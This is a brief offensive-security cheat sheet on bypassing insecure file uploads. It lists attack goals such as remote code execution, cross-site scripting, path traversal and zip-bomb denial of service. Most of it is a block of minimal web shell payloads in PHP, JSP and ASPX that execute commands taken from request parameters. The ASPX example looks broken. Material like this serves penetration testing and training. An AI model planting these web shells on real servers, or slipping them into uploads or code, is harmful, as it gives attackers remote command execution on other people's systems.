# File Upload Bypass

> Insecure file upload allows attackers to upload malicious files leading to RCE, XSS, or path traversal.

---

## 💥 Attack Goals

1. **RCE** — Upload web shell (.php, .jsp, .aspx)
2. **XSS** — Upload SVG/HTML with scripts
3. **Path Traversal** — Write file to unintended location
4. **DoS** — Upload huge files, zip bombs

---

## 🐚 Web Shell Payloads

```php
# Minimal PHP shell
<?php system($_GET['cmd']); ?>
<?php passthru($_GET['cmd']); ?>
<?php echo shell_exec($_GET['cmd']); ?>
<?php eval($_POST['cmd']); ?>

# One-liner
<?=`$_GET[0]`?>

# JSP shell
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>

# ASPX shell
<% Response.Write(new System.Diagnostics.Process()); %>
```

